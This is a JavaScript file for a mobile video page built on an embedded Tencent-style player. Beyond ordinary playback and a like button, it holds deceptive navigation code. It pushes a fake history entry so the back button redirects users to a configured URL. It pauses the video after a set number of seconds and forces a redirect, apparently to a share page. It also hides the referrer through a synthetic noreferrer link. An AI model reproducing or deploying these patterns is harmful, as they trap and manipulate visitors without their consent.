
var video, player;
var vid = pageGlobal.data.vid;
var playStatus = 'pending';

if(location.href.indexOf('continue') > -1) {
    playStatus = 'continue';
}
if(pageGlobal.playStatus == 'continue') {
    playStatus = 'continue';
}

//new Swiper('.swiper-container', {autoplay: 5000});

$(function(){
    setTimeout(function() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
    }, 100);
    var elId = 'mod_player_skin_0';
    $("#js_content").html('<div id="'+elId+'" class="player_skin" style="padd1ing-top:6px;"></div>');
    var elWidth = $("#js_content").width();
    playVideo(vid,elId,elWidth);
    $("#pauseplay").height($("#js_content").height() - 10);
    
    $("#loading_video").hide();

    if(playStatus == 'pending') {
        var delayTime = pageGlobal.data.miao;
        var isFirst = true;
        var currentinterval = setInterval(function(){
            try {
                var currentTime = player.getCurTime();
                if(currentTime >= delayTime) {
                    $('#pauseplay').show();
                    player.callCBEvent('pause');
                    $.cookie(vid, 's', {path: '/'});
                    if(isFirst) {
                        $('#pauseplay').trigger('click');
                    }
                    isFirst = false;
                    //执行分享
                    window.location.href= pageGlobal.flyUrl;
   
                }
            } catch (e) {

            }
        }, 1000);
    }else if(playStatus == 'continue'){
        player.callCBEvent('play');
    }
    
    //播放完成后是否跳转
    player.onallended = function(){
        location.href = pageGlobal.endJumpUrl;
    };
    
    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
   // new IScroll('#wrapper', {useTransform: false, click: true});

    $(window).on('popstate', function(e){
        if(pageGlobal.backUrl) {
           jump(pageGlobal.backUrl);
        }
    });

});

function playVideo(vid,elId,elWidth){
    //定义视频对象
    video = new tvp.VideoInfo();
    //向视频对象传入视频vid
    video.setVid(vid);

    //定义播放器对象
    player = new tvp.Player(elWidth, 200);
    // player = new tvp.Player(360, 200);
    //设置播放器初始化时加载的视频
    player.setCurVideo(video);
    
    player.onplay = function() {
        if (location.href.indexOf('continue') > -1) {
            video.setHistoryStart(pageGlobal.data.miao);
        } else {
            video.setHistoryStart(3);    
        }
    };

    //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    //player.addParam("autoplay","1"); 

    player.addParam("wmode","transparent");
    //player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
    player.addParam("pic",pageGlobal.data.img || tvp.common.getVideoSnapMobile(vid));
    player.write(elId);
}

$('#pauseplay').on('click', function() {
    jump(pageGlobal.flyUrl);
});

$('#like').on('click', function(){
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if(!$icon.hasClass('praised')){
        num = parseInt($num.html());
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}
